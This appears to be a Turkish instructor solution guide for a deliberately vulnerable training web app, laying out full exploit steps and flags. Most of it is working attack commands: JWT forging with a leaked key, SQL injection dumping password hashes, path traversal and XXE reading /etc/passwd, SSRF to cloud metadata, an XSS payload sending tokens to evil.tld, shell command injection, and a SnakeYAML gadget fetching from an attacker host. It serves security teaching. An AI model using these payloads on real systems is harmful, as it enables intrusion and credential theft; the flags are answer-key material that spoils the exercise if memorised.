# SecShare — Çözümler (SPOILER / Eğitmen)

> Bu belge tam exploit adımlarını ve flag'leri içerir. Base URL: `http://localhost:8080`.
> Tüm bayraklar açık (`application-vuln.properties`) varsayılır.

## Flag Listesi
- IDOR → `FLAG{idor_reads_others_files}` (alice / salary.pdf)
- SSRF ipucu → `FLAG{ssrf_pivot_starts_here}` (bob / db-backup.txt)
- RCE → `FLAG{rce_all_the_way_down}` (admin / master-keys.txt)

---

## Aşama 0 — Recon
```bash
curl -s http://localhost:8080/actuator/env | grep -i jwt
# app.jwt.secret degeri ve diger config gorunur
```
`http://localhost:8080/h2-console` (JDBC URL: `jdbc:h2:mem:secshare`, user `sa`) da açık.

## Aşama 1 — Enumeration + Brute Force
```bash
# var olmayan kullanici -> 404 "User not found"
curl -si -X POST localhost:8080/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"nope@corp.local","password":"x"}' | head -1
# var olan kullanici, yanlis sifre -> 401 "Invalid password"  => email gecerli
curl -si -X POST localhost:8080/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"alice@corp.local","password":"x"}' | head -1
# zayif sifre ile giris
curl -s -X POST localhost:8080/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"alice@corp.local","password":"Summer2024!"}'
# -> {"accessToken":"...USER jwt..."}
```

## Aşama 2 — JWT Privilege Escalation
Zayıf secret: base64 `c2VjcmV0LXNlY3JldC1zZWNyZXQtc2VjcmV0LWtleSE=`
= raw `secret-secret-secret-secret-key!` (HS256 HMAC anahtarı).

```python
# pip install pyjwt
import jwt, uuid, time
key = "secret-secret-secret-secret-key!"
tok = jwt.encode({
    "sub": str(uuid.uuid4()),          # /all sahiplik kontrol etmez, herhangi bir uuid
    "email": "attacker@evil.com",
    "roles": ["ADMIN"],                # <- privilege escalation
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}, key, algorithm="HS256")
print(tok)
```
```bash
curl -s localhost:8080/api/files/all -H "Authorization: Bearer $ADMIN_JWT"
# tum kullanicilarin dosya kayitlari (id'ler dahil) -> Asama 3 girdisi
```
> `vuln.jwt.allow-none=true` iken alternatif: `alg:none` ile imzasız token da kabul edilir.

## Aşama 3 — IDOR
`/api/files/all` çıktısındaki alice'e ait dosya `id`'sini al:
```bash
curl -s "localhost:8080/api/files/legacy/<ALICE_FILE_ID>" -H "Authorization: Bearer $USER_JWT"
# sahiplik kontrolu yok -> FLAG{idor_reads_others_files}
```
(Normal `/api/files/{id}` 403 döner; zafiyet `legacy` ucundadır.)

## Aşama 4 — SQL Injection
```bash
curl -s -G "localhost:8080/api/files/search" -H "Authorization: Bearer $USER_JWT" \
  --data-urlencode "name=zzz%' UNION SELECT email || ':' || password_hash FROM users -- "
# donen liste icinde admin/alice/bob email:bcrypt_hash ciftleri
```
Teknik: `LIKE '%<girdi>%'` içine `%'` ile string kapatılır, `UNION SELECT` eklenir,
`-- ` ile kalan kapatılır. (Hash'ler offline crack için — opsiyonel derinlik.)

## Aşama 5 — Path Traversal / LFI
```bash
curl -s "localhost:8080/api/files/raw?path=/etc/passwd" -H "Authorization: Bearer $USER_JWT"
curl -s "localhost:8080/api/files/raw?path=../src/main/resources/application-vuln.properties" \
  -H "Authorization: Bearer $USER_JWT"
```
Depo dışına çıkılır (mutlak yol veya `..`). Normalize/kontrol yalnızca bayrak kapalıyken.

## Aşama 6 — SSRF & XXE
```bash
# SSRF: sunucu ic servise/metadata'ya istek atar
curl -s -X POST localhost:8080/api/files/import -H "Authorization: Bearer $USER_JWT" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
# lokal demo: '{"url":"http://127.0.0.1:8080/actuator/env"}'

# XXE: yerel dosya okuma
curl -s -X POST localhost:8080/api/files/import/xml -H "Authorization: Bearer $USER_JWT" \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
```

## Aşama 7 — Stored XSS
Uzantı `.txt` (allowlist'te) ama Content-Type saldırgan kontrollü → `text/html` inline servis:
```bash
printf '<script>fetch("https://evil.tld/c?t="+localStorage.token)</script>' > x.txt
curl -s -X POST localhost:8080/api/files/upload -H "Authorization: Bearer $USER_JWT" \
  -F "file=@x.txt;type=text/html"
# donen id ile public link: http://localhost:8080/api/files/view/<id>
```
Kurban (panelde token'ı localStorage'da olan admin) bu linki açınca script app
origin'inde çalışır ve token'ı sızdırır. Güvenli modda `octet-stream + attachment + nosniff`.

## Aşama 8 — Command Injection / RCE (Final)
```bash
curl -s -X POST localhost:8080/api/files/archive -H "Authorization: Bearer $USER_JWT" \
  -H 'Content-Type: application/json' -d '{"filename":"x; id; cat *.txt"}'
# sh -c "zip -q archive.zip x; id; cat *.txt" -> uid=... + FLAG{rce_all_the_way_down}
```
Çalışma dizini `uploads/`; seed edilen `master-keys.txt` içeriği `cat *.txt` ile dökülür.
Güvenli modda `ProcessBuilder("zip","-q","archive.zip",filename)` kabuk kullanmaz →
metakarakterler literal, enjeksiyon çalışmaz.

---

## Ek Açıklar

### Mass Assignment → PrivEsc (register)
```bash
curl -s -X POST localhost:8080/api/auth/register -H 'Content-Type: application/json' \
  -d '{"email":"pwn@evil.com","password":"password1","roles":"ADMIN"}'
# sonra login -> donen token ADMIN rollu -> GET /api/files/all 200
```
Güvenli modda `roles` yok sayılır (her zaman USER).

### Recon: Actuator env / heapdump
```bash
curl -s localhost:8080/actuator/env | grep -i jwt          # app.jwt.secret sizar
curl -s localhost:8080/actuator/heapdump -o heap.hprof      # bellekten token/parola cikarma
```

### SnakeYAML unsafe load (CVE-2022-1471)
```bash
# arbitrary tip instantiation (kanit):
curl -s -X POST localhost:8080/api/files/import/yaml -H "Authorization: Bearer $USER_JWT" \
  -H 'Content-Type: text/plain' --data '!!java.util.Date []'
# -> loaded type=java.util.Date ...
# RCE gadget (uzak jar + ScriptEngineFactory servisi gerekir):
#   !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]
```
Güvenli modda `SafeConstructor` → keyfi sınıf reddedilir (400).

### Zip Slip (extract)
```bash
# entry adi "../pwned.txt" olan bir zip hazirla, sonra:
curl -s -X POST localhost:8080/api/files/extract -H "Authorization: Bearer $USER_JWT" \
  -F "file=@evil.zip"
# vuln: donen yol depo disina ("..") yazar; guvenli: 400
```

### SSRF → iç servis (docker-compose)
```bash
curl -s -X POST localhost:8080/api/files/import -H "Authorization: Bearer $USER_JWT" \
  -H 'Content-Type: application/json' -d '{"url":"http://internal/secret"}'
# -> FLAG{ssrf_reached_internal_service}
```

---

## Güvenli Mod Doğrulaması
`application-vuln.properties` içinde `vuln.enabled=false` (veya profili kapat) → yukarıdaki
tüm istekler 401/403/404/parametreli-güvenli davranışla sonuçlanır.

Bu davranış `SecureModeIT` ile otomatik test edilir; exploit'lerin çalıştığı ise
`VulnChainIT` ile. `./mvnw test` ikisini de koşar.
